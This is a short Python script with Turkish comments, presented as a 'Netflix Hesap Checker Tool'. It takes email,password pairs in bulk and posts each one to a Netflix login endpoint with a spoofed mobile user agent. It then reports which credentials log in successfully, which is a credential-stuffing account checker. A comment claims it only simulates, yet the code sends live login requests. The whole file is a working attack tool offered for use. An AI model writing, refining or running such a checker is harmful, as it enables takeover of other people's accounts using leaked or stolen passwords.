import requests
import json

ascii_art = """
 _    _      ____    __    
| |  | |   .'    '. /  |   
| |__| |_ |  .--.  |`| |   
|____   _|| |    | | | |   
    _| |_ |  `--'  |_| |_  
   |_____| '.____.'|_____| 
"""

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
    "Content-Type": "application/json"
}

def kontrol_et(email, password):
    url = "https://www.netflix.com/api/shakti/v1/login"  # Gerçek login API değil! Simüle ediyoruz.
    data = {
        "userLoginId": email,
        "password": password
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            # Netflix bazen JSON dönmez, düz HTML döner
            if "Incorrect password" in response.text:
                return False, "❌ Şifre Hatalı"
            elif "No account found" in response.text:
                return False, "❌ Hesap Bulunamadı"
            elif "nextPage" in response.text or "profilesGate" in response.text:
                return True, "✅ Başarılı Giriş"
            else:
                return False, "❓ Bilinmeyen Yanıt"
        elif response.status_code == 403:
            return False, "🚫 Engellendi"
        else:
            return False, f"⚠️ Durum: {response.status_code}"
    except Exception as e:
        return False, f"⚠️ Hata: {str(e)}"

def main():
    print(ascii_art)
    print("Netflix Hesap Checker Tool")
    print("E-posta ve şifreleri 'eposta,sifre' şeklinde girin.")
    print("Bitirince 'done' yazın.\n")

    hesaplar = []

    while True:
        giris = input("> ")
        if giris.lower().strip() == "done":
            break
        if ',' in giris:
            hesaplar.append(giris.strip())
        else:
            print("⚠️ Geçersiz format. eposta,sifre şeklinde gir.")

    print("\n🔍 Hesaplar taranıyor...\n")

    for h in hesaplar:
        email, sifre = h.split(',', 1)
        durum, mesaj = kontrol_et(email.strip(), sifre.strip())
        print(f"{email.strip()} → {mesaj}")

    print("\n✅ Tarama bitti.")

if __name__ == "__main__":
    main()
